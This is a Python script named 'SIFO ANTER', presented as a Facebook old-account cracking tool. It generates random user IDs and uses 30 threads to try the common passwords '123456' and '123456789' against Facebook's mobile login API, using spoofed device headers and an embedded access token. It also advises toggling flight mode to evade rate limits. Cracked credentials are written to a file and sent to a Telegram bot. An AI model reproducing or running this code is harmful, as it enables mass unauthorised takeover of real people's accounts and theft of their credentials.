from concurrent.futures import ThreadPoolExecutor as tred
import requests
import sys
from os import system as cmd
from random import randint as rr, choice as rc
from string import digits
import time
from rich import print
from rich.panel import Panel

class SifoAnter:
    def __init__(self):
        self.token = ""
        self.bot_id = ""
        self.loop = 0
        self.ok = 0
        
    def logo(self):
        """SIFO ANTER Logo"""
        banner = '''
[bold cyan]
   ███████╗██╗███████╗ ██████╗      █████╗ ███╗   ██╗████████╗███████╗██████╗ 
   ██╔════╝██║██╔════╝██╔═══██╗    ██╔══██╗████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████╗██║█████╗  ██║   ██║    ███████║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ╚════██║██║██╔══╝  ██║   ██║    ██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ███████║██║██║     ╚██████╔╝    ██║  ██║██║ ╚████║   ██║   ███████╗██║  ██║
   ╚══════╝╚═╝╚═╝      ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
[/bold cyan]
[bold magenta]
        ╔═══════════════════════════════════════════════════════════╗
        ║              FB OLD ACCOUNTS CRACKING TOOL               ║
        ║                    [ VERSION 3.0 ]                       ║
        ╚═══════════════════════════════════════════════════════════╝
[/bold magenta]
[bold yellow]        ┌─────────────────────────────────────────────────┐
        │  [bold green]Developer[/bold green] : SIFO ANTER                       │
        │  [bold cyan]Telegram[/bold cyan]  : @bsqsm455                        │
        │  [bold red]Warning[/bold red]   : Educational Purpose Only         │
        └─────────────────────────────────────────────────────────┘[/bold yellow]
'''
        print(banner)
        
    def clear(self):
        """Clear screen"""
        cmd("clear" if sys.platform != "win32" else "cls")
        
    def line(self):
        """Print line separator"""
        print("[bold cyan]" + "═" * 70 + "[/bold cyan]")
        
    def main(self):
        """Main menu"""
        self.clear()
        self.logo()
        self.line()
        
        print(Panel('''
[bold green]┌──[/bold green] [bold yellow]CHOOSE YOUR OPTION[/bold yellow] [bold green]──┐[/bold green]

[bold cyan]1[/bold cyan] ➤ [bold green]OLD 2009-2014[/bold green]
[bold cyan]2[/bold cyan] ➤ [bold red]EXIT[/bold red]

[bold green]└────────────────────────┘[/bold green]
        ''', border_style="magenta"))
        
        self.line()
        choice = input('[bold yellow]~>> [/bold yellow][bold green]SELECT[/bold green] : ')
        
        if choice == "1":
            self.settings()
        elif choice == "2":
            print("[bold red]>> Goodbye! <<[/bold red]")
            sys.exit(0)
        else:
            print("[bold red]>> Invalid Option![/bold red]")
            time.sleep(1)
            self.main()
            
    def settings(self):
        """Setup configuration"""
        self.clear()
        self.logo()
        self.line()
        
        print(Panel('[bold cyan]>> BOT CONFIGURATION <<[/bold cyan]', border_style="green"))
        self.token = input('[bold yellow]~>> [/bold yellow][bold green]Enter Bot Token[/bold green] : ').strip()
        self.bot_id = input('[bold yellow]~>> [/bold yellow][bold green]Enter Bot ID[/bold green] : ').strip()
        
        # Test bot connection
        try:
            test = requests.get(f'https://api.telegram.org/bot{self.token}/getMe', timeout=10)
            if test.status_code == 200:
                bot_data = test.json()
                if bot_data.get('ok'):
                    print(Panel(f"[bold green]✓ Connected Successfully![/bold green]\n[bold cyan]Bot Name:[/bold cyan] {bot_data['result']['first_name']}", 
                               border_style="green"))
                    time.sleep(1)
                    self.start_crack()
                else:
                    print(Panel("[bold red]✗ Invalid Token![/bold red]", border_style="red"))
                    time.sleep(2)
                    self.settings()
            else:
                print(Panel("[bold red]✗ Connection Failed![/bold red]", border_style="red"))
                time.sleep(2)
                self.settings()
        except:
            print(Panel("[bold red]✗ Network Error![/bold red]", border_style="red"))
            time.sleep(2)
            self.settings()
            
    def start_crack(self):
        """Start cracking process"""
        self.clear()
        self.logo()
        self.line()
        
        print(Panel('[bold cyan]>> CRACK CONFIGURATION <<[/bold cyan]', border_style="yellow"))
        print('[bold yellow]>> Example : 10000 | 50000 | 100000[/bold yellow]')
        
        try:
            limit = int(input('[bold yellow]~>> [/bold yellow][bold green]Enter Limit[/bold green] : '))
        except:
            print("[bold red]>> Invalid Number![/bold red]")
            time.sleep(1)
            return self.start_crack()
            
        # Generate IDs
        user_list = []
        print('\n[bold cyan]>> Generating IDs...[/bold cyan]')
        for _ in range(limit):
            nmp = ''.join(rc(digits) for _ in range(10))
            user_list.append("10000" + nmp)
            
        # Start cracking
        self.clear()
        self.logo()
        self.line()
        
        total = str(len(user_list))
        print(Panel(f'''
[bold green]✓ TOTAL IDS[/bold green]    : [bold yellow]{total}[/bold yellow]
[bold green]✓ PASSWORDS[/bold green]    : [bold cyan]123456 + 123456789[/bold cyan]
[bold green]✓ THREADS[/bold green]      : [bold magenta]30[/bold magenta]
[bold red]⚠ TIP[/bold red]          : [bold yellow]ON/OFF Flight Mode Every 5 Min[/bold yellow]
        ''', border_style="green", title="[bold cyan]CRACK INFO[/bold cyan]"))
        
        self.line()
        
        # Send start message
        start_msg = f'''
🚀 <b>SIFO ANTER - TOOL STARTED</b>

📊 <b>Total IDs:</b> {total}
🔑 <b>Passwords:</b> 123456, 123456789
⚡ <b>Threads:</b> 30
⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}

🎯 <b>Starting Crack Process...</b>
        '''
        self.send_tg(start_msg)
        
        with tred(max_workers=30) as executor:
            for uid in user_list:
                passwords = ['123456', '123456789']
                executor.submit(self.crack, uid, passwords, total)
                
        # Show results
        self.line()
        print(Panel(f'''
[bold green]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold green]
[bold cyan]           ✓ CRACKING COMPLETED ✓[/bold cyan]
[bold green]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold green]

[bold yellow]📊 STATISTICS:[/bold yellow]

[bold cyan]   ✅ Total Success[/bold cyan]   : [bold green]{self.ok}[/bold green]
[bold cyan]   🔄 Total Attempts[/bold cyan]  : [bold yellow]{self.loop}[/bold yellow]
[bold cyan]   📁 File Location[/bold cyan]   : [bold magenta]/sdcard/SIFO-OLD-OK.txt[/bold magenta]

[bold green]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold green]
        ''', border_style="green", title="[bold magenta][ FINAL RESULTS ][/bold magenta]"))
        
        # Display results from file if exists
        try:
            if self.ok > 0:
                print("\n[bold cyan]" + "═" * 70 + "[/bold cyan]")
                print("[bold yellow]📂 SHOWING SAVED RESULTS:[/bold yellow]")
                print("[bold cyan]" + "═" * 70 + "[/bold cyan]\n")
                
                with open("/sdcard/SIFO-OLD-OK.txt", 'r') as f:
                    print(f.read())
                    
                print("[bold cyan]" + "═" * 70 + "[/bold cyan]")
        except:
            pass
        
        # Send final message
        end_msg = f'''
📊 <b>SIFO ANTER - FINAL RESULTS</b>

✅ <b>Success:</b> {self.ok}
🔄 <b>Attempts:</b> {self.loop}
⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}

💾 <b>Saved in:</b> /sdcard/SIFO-OLD-OK.txt

<i>Tool by SIFO ANTER</i>
        '''
        self.send_tg(end_msg)
        
        self.line()
        input('[bold yellow]~>> Press Enter To Continue...[/bold yellow]')
        self.main()
        
    def crack(self, uid, passwords, total):
        """Crack single account"""
        global loop, ok
        
        sys.stdout.write(f"\r[bold cyan]~>> SIFO ANTER[/bold cyan] [bold yellow]~>> {self.loop}[/bold yellow] [bold green]~>> OK ~>> {self.ok}[/bold green] \r")
        sys.stdout.flush()
        
        try:
            for ps in passwords:
                session = requests.Session()
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': self.ua(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={ps}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                
                response = session.get(url, headers=headers, timeout=20)
                result = response.json()
                
                if "Please Confirm Email" in str(result) or "session_key" in result:
                    # Display in console with colors
                    self.line()
                    print(f"\n[bold green]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold green]")
                    print(f"[bold cyan]✓ SUCCESS FOUND[/bold cyan]")
                    print(f"[bold green]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold green]")
                    print(f"[bold yellow]👤 ID[/bold yellow]       : [bold cyan]{uid}[/bold cyan]")
                    print(f"[bold yellow]🔑 PASSWORD[/bold yellow] : [bold magenta]{ps}[/bold magenta]")
                    print(f"[bold yellow]🔗 LINK[/bold yellow]     : [bold blue]https://www.facebook.com/{uid}[/bold blue]")
                    print(f"[bold yellow]📅 TYPE[/bold yellow]     : [bold green]OLD 2009-2014[/bold green]")
                    print(f"[bold yellow]⏰ TIME[/bold yellow]     : [bold white]{time.strftime('%H:%M:%S')}[/bold white]")
                    print(f"[bold green]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold green]\n")
                    
                    # Save result to file
                    try:
                        with open("/sdcard/SIFO-OLD-OK.txt", 'a') as f:
                            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                            f.write(f"✓ SUCCESS - SIFO ANTER\n")
                            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                            f.write(f"ID       : {uid}\n")
                            f.write(f"PASSWORD : {ps}\n")
                            f.write(f"LINK     : https://www.facebook.com/{uid}\n")
                            f.write(f"TYPE     : OLD 2009-2014\n")
                            f.write(f"TIME     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                    except:
                        pass
                    
                    self.ok += 1
                    
                    # Send to telegram
                    success_msg = f'''
🎉 <b>SUCCESS - SIFO ANTER</b>

━━━━━━━━━━━━━━━━━━━
👤 <b>ID:</b> <code>{uid}</code>
🔑 <b>Password:</b> <code>{ps}</code>
━━━━━━━━━━━━━━━━━━━

🔗 <b>Link:</b>
https://www.facebook.com/{uid}

📅 <b>Type:</b> OLD 2009-2014
⏰ <b>Time:</b> {time.strftime('%H:%M:%S')}

━━━━━━━━━━━━━━━━━━━
<i>BY: @bsqsm455</i>
<i>Tool: SIFO ANTER V3.0</i>
                    '''
                    self.send_tg(success_msg)
                    break
                    
                self.loop += 1
                
        except Exception as e:
            pass
            
    def send_tg(self, message):
        """Send telegram message"""
        try:
            url = f'https://api.telegram.org/bot{self.token}/sendMessage'
            data = {
                'chat_id': self.bot_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            requests.post(url, data=data, timeout=10)
        except:
            pass
            
    def ua(self):
        """Get user agent"""
        agents = [
            "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
            "Dalvik/2.1.0 (Linux; U; Android 9.0; SM-G960F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/200.0.0.16.84;FBPN/com.facebook.orca;FBLC/en_US;FBBV/140726798;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960F;FBSV/9.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]",
            "Dalvik/2.1.0 (Linux; U; Android 10; SM-N975F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/210.0.0.19.71;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/150817146;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-N975F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=3040};FB_FW/1;]"
        ]
        return rc(agents)

# Run tool
if __name__ == "__main__":
    try:
        print("[bold cyan]>> Loading SIFO ANTER Tool...[/bold cyan]")
        time.sleep(1)
        tool = SifoAnter()
        tool.main()
    except KeyboardInterrupt:
        print("\n[bold red]>> Tool Stopped By User![/bold red]")
        sys.exit(0)
    except Exception as e:
        print(f"[bold red]>> Error: {str(e)}[/bold red]")
        sys.exit(1)